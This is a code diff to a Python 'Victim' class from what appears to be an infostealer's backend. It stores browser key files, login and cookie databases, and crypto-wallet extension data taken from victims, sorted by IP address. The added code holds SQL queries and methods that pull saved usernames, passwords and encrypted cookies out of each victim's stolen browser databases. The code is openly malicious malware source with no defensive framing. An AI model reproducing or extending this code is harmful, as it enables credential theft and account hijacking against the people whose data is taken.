@@ -1,13 +1,16 @@
 """victim class"""
 import os
 import json
+import sqlite3
 
 
-class Victim:
+class Victim():
     """class for handling victims"""
     __BROWSERDATA = {"HASH": "KEY", "Login Data": "LOGIN.DB", "Cookies": "COOKIES.DB"}
     __EXTENTIONDATA = {"a": "METAMASK", "b": "TRUST WALLER", "c": "AUTHENTICATOR"}
     __StorageFile = "storage.json"
+    PasswordsQuery = "SELECT origin_url, username_value, password_value FROM logins"
+    CookiesQuery = "SELECT host_key, path, is_httponly, expires_utc, name, encrypted_value FROM cookies"
     CurrentVictim = {}
     AllVictims = {}
 
@@ -16,7 +19,7 @@ class Victim:
         self.ip = ip
         self.__VictimFolder = self.ip
         self.LoadStorage()
-        if self.__VictimFolder != None and not os.path.exists(self.__VictimFolder):
+        if self.__VictimFolder is not None and not os.path.exists(self.__VictimFolder):
             os.mkdir(self.__VictimFolder)
 
     def SaveStorage(self) -> None:
@@ -70,6 +73,7 @@ class Victim:
                 os.mkdir(ExtentionPathName)
             FilePath = os.path.join(ExtentionPathName, FileName)
             self.LogFile(FileName, DirName)
+
         self.SaveStorage()
 
         return FilePath
@@ -86,3 +90,71 @@ class Victim:
         else:
             BrowserFiles = self.CurrentVictim["browsers"][self.CurrentVictim["BrowserCount"] - 1]["browserfiles"]
             BrowserFiles.append(FileName)
+
+    def CheckBrowserFiles(self, files: list) -> bool:
+        """
+        check weather a browser has all the needed files.
+        args:
+            files (list): list of the present files.
+        """
+        BrowserFiles = ["KEY", "COOKIES.DB", "LOGIN.DB"]
+        for file in files:
+            if file not in BrowserFiles:
+                return False
+
+        return True
+
+    def GetFilePath(self, browser: str, FileName: str) -> str:
+        """
+        Get the absolute path of a file.
+        args:
+            browser (str): browser number.
+            FileName (str): file name.
+
+        return:
+            str: the absolute path.
+        """
+        path = os.path.join(os.getcwd(), self.ip)
+        path = os.path.join(path, browser)
+        path = os.path.join(path, FileName)
+
+        return path
+
+    def ExtractDataFromDb(self, DbPath: str, SqlQuery: str) -> list:
+        """
+        open a database and execute a qurey to extract data, based on the executed query.
+        args:
+            DbOath (str): the absolute path of the data base.
+            SqlQuery (str): sql query.
+
+        return:
+            List[tuple]: list of tuples containing the extracted data from database.
+        """
+        db = sqlite3.connect(DbPath)
+        cursor = db.cursor()
+        cursor.execute(SqlQuery)
+        data = cursor.fetchall()
+
+        cursor.close()
+        db.close()
+
+        return data
+
+    def GetVictimBrowserData(self) -> dict:
+        """
+        Get victim browser data
+        """
+        FullBrowsersData = {"PASSWORDS": [], "COOKIES": []}
+
+        for browser in range(self.CurrentVictim["BrowserCount"]):
+            if self.CheckBrowserFiles(self.CurrentVictim["browsers"][browser]["browserfiles"]) is True:
+                LoginDbPath = self.GetFilePath(str(browser + 1), "LOGIN.DB")
+                CookiesDbPath = self.GetFilePath(str(browser + 1), "COOKIES.DB")
+
+                data = self.ExtractDataFromDb(LoginDbPath, self.PasswordsQuery)
+                FullBrowsersData["PASSWORDS"].append(data)
+
+                data = self.ExtractDataFromDb(CookiesDbPath, self.CookiesQuery)
+                FullBrowsersData["COOKIES"].append(data)
+
+        return FullBrowsersData
